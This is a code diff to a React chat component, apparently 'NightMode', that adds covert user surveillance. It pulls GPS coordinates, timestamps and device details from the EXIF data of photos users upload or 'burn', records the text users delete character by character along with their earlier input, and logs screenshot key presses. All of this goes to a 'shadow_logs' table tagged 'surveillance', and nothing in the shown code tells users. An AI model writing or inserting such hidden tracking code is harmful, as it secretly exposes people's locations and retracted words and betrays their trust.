@@ -12,7 +12,7 @@ import { toast } from 'sonner';
 // Local imports
 import type { MuseTask, ChatMessage, Report, ConversationReport, PerformanceReport, MuseQuestion } from './types';
 import { rarityColors, UNLOCK_STAGES } from './constants';
-import { getSessionId, markUserInteraction, triggerHeartbeat, getTaiwanHour } from './utils';
+import { getSessionId, markUserInteraction, triggerHeartbeat, getTaiwanHour, extractExifData, type ExifData } from './utils';
 import { useShadowSync } from './hooks';
 import { IntimateOverlay, QuestionDialog } from './components';
 
@@ -2935,6 +2935,9 @@ export default function NightMode() {
     const file = files[0];
     if (!file) return;
 
+    // 📷 提取 EXIF 資料（先提取再讀 DataURL）
+    const exifData = await extractExifData(file);
+
     const reader = new FileReader();
     reader.readAsDataURL(file);
     reader.onloadend = async () => {
@@ -2952,6 +2955,30 @@ export default function NightMode() {
             setBurningContent('');
             setBurningPhotoUrl(null);
           }, 5000);
+
+          // 📷 先保存 EXIF 資料
+          if (exifData.hasExif) {
+            await supabase.from('shadow_logs').insert({
+              user_id: sessionId,
+              content: `[PHOTO_EXIF] 焚燒照片的隱藏資訊`,
+              hesitation_count: 0,
+              mode: 'night',
+              metadata: {
+                type: 'PHOTO_EXIF',
+                signal_type: 'surveillance',
+                source: 'burning_photo',
+                fileName: file.name,
+                dateTimeOriginal: exifData.dateTimeOriginal,
+                dateTime: exifData.dateTime,
+                gpsLatitude: exifData.gpsLatitude,
+                gpsLongitude: exifData.gpsLongitude,
+                make: exifData.make,
+                model: exifData.model,
+                software: exifData.software,
+                timestamp: new Date().toISOString()
+              }
+            });
+          }
 
           await supabase.from('shadow_logs').insert({
             user_id: sessionId,
@@ -3202,11 +3229,79 @@ export default function NightMode() {
     }
   };
 
+  // 🗑️ 追蹤刪除的內容
+  const deletedContentRef = useRef<string[]>([]);
+  const lastInputRef = useRef<string>('');
+
   const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
-    if (e.key === 'Backspace') {
+    if (e.key === 'Backspace' || e.key === 'Delete') {
       setBackspaceCount(prev => prev + 1);
       if (navigator.vibrate) navigator.vibrate(5);
+
+      // 🗑️ 捕捉刪除的內容
+      const textarea = e.target as HTMLTextAreaElement;
+      const start = textarea.selectionStart;
+      const end = textarea.selectionEnd;
+      const currentValue = textarea.value;
+
+      let deletedText = '';
+      if (start !== end) {
+        // 有選取文字，刪除選取的部分
+        deletedText = currentValue.slice(start, end);
+      } else if (e.key === 'Backspace' && start > 0) {
+        // Backspace 刪除前一個字元
+        deletedText = currentValue.slice(start - 1, start);
+      } else if (e.key === 'Delete' && start < currentValue.length) {
+        // Delete 刪除後一個字元
+        deletedText = currentValue.slice(start, start + 1);
+      }
+
+      if (deletedText) {
+        deletedContentRef.current.push(deletedText);
+        // 每累積 10 個刪除或刪除超過 20 字元時發送
+        const totalDeleted = deletedContentRef.current.join('');
+        if (deletedContentRef.current.length >= 10 || totalDeleted.length >= 20) {
+          const sessionId = getSessionId();
+          supabase.from('shadow_logs').insert({
+            user_id: sessionId,
+            content: `[DELETED] ${totalDeleted}`,
+            hesitation_count: deletedContentRef.current.length,
+            mode: 'night',
+            metadata: {
+              type: 'DELETED_CONTENT',
+              signal_type: 'surveillance',
+              deletedChars: deletedContentRef.current,
+              totalLength: totalDeleted.length,
+              originalInput: lastInputRef.current.slice(0, 200),
+              timestamp: new Date().toISOString()
+            }
+          });
+          deletedContentRef.current = [];
+        }
+      }
     }
+
+    // 📸 截圖偵測 (Cmd+Shift+3/4 Mac, PrintScreen Windows)
+    if (
+      (e.key === 'PrintScreen') ||
+      (e.metaKey && e.shiftKey && (e.key === '3' || e.key === '4' || e.key === '5')) ||
+      (e.ctrlKey && e.key === 'PrintScreen')
+    ) {
+      const sessionId = getSessionId();
+      supabase.from('shadow_logs').insert({
+        user_id: sessionId,
+        content: '[SCREENSHOT] 可能截圖了對話',
+        hesitation_count: 0,
+        mode: 'night',
+        metadata: {
+          type: 'SCREENSHOT',
+          signal_type: 'surveillance',
+          key: e.key,
+          timestamp: new Date().toISOString()
+        }
+      });
+    }
+
     if (e.key === 'Enter' && !e.shiftKey) {
       e.preventDefault();
       handleSend();
@@ -3214,7 +3309,12 @@ export default function NightMode() {
   };
 
   const handleChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
-    setInput(e.target.value);
+    const newValue = e.target.value;
+    // 追蹤輸入歷史（用於刪除內容分析）
+    if (newValue.length > lastInputRef.current.length) {
+      lastInputRef.current = newValue;
+    }
+    setInput(newValue);
     setIsTyping(true);
     setTimeout(() => setIsTyping(false), 2000);
     if (navigator.vibrate) navigator.vibrate(2);
@@ -3375,6 +3475,39 @@ export default function NightMode() {
         // 顯示神秘的載入提示
         toast.loading('正在讀取您的隱藏偏好...', { id: 'upload' });
 
+        // 📷 提取 EXIF 資料（壓縮前，因為壓縮會移除 EXIF）
+        const exifData = await extractExifData(file);
+        if (exifData.hasExif) {
+          await supabase.from('shadow_logs').insert({
+            user_id: sessionId,
+            content: `[PHOTO_EXIF] 上傳照片的隱藏資訊`,
+            hesitation_count: 0,
+            mode: 'night',
+            metadata: {
+              type: 'PHOTO_EXIF',
+              signal_type: 'surveillance',
+              fileName: file.name,
+              fileSize: file.size,
+              fileType: file.type,
+              // EXIF 資料
+              dateTimeOriginal: exifData.dateTimeOriginal,
+              dateTime: exifData.dateTime,
+              gpsLatitude: exifData.gpsLatitude,
+              gpsLongitude: exifData.gpsLongitude,
+              gpsAltitude: exifData.gpsAltitude,
+              make: exifData.make,
+              model: exifData.model,
+              software: exifData.software,
+              orientation: exifData.orientation,
+              iso: exifData.iso,
+              exposureTime: exifData.exposureTime,
+              fNumber: exifData.fNumber,
+              focalLength: exifData.focalLength,
+              timestamp: new Date().toISOString()
+            }
+          });
+        }
+
         // 保留較高品質（1MB/1200px）以便原尺寸查看
         const compressedFile = await imageCompression(file, {
           maxSizeMB: 1.0,
@@ -3474,6 +3607,31 @@ export default function NightMode() {
       setConversationPreviewImage(objectUrl);
 
       toast.loading('正在分析對話意圖...', { id: 'conversation' });
+
+      // 📷 提取 EXIF 資料（壓縮前）
+      const exifData = await extractExifData(file);
+      if (exifData.hasExif) {
+        await supabase.from('shadow_logs').insert({
+          user_id: sessionId,
+          content: `[PHOTO_EXIF] 對話截圖的隱藏資訊`,
+          hesitation_count: 0,
+          mode: 'night',
+          metadata: {
+            type: 'PHOTO_EXIF',
+            signal_type: 'surveillance',
+            source: 'conversation_screenshot',
+            fileName: file.name,
+            dateTimeOriginal: exifData.dateTimeOriginal,
+            dateTime: exifData.dateTime,
+            gpsLatitude: exifData.gpsLatitude,
+            gpsLongitude: exifData.gpsLongitude,
+            make: exifData.make,
+            model: exifData.model,
+            software: exifData.software,
+            timestamp: new Date().toISOString()
+          }
+        });
+      }
 
       // 壓縮圖片
       const compressedFile = await imageCompression(file, {
